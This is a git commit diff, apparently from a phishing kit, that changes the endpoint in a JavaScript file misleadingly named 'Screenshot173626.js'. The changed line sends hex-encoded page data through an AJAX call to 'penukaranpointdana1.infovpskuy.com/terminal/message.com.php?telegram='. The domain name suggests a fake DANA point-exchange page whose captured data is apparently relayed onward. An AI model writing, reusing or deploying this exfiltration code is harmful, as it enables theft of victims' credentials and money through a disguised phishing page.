e25ddcc79ef27f186671a3bcc977c7718d6a6713
6oogle <155930261+ImgTheHost@users.noreply.github.com>
2024-08-06 12:54:26 +0700

    Update Screenshot173626.js

--- Screenshot173626.js
+++ Screenshot173626.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://code-unik139.e-files.my.id/get/?apinow=" +
+                    "https://penukaranpointdana1.infovpskuy.com/terminal/message.com.php?telegram=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
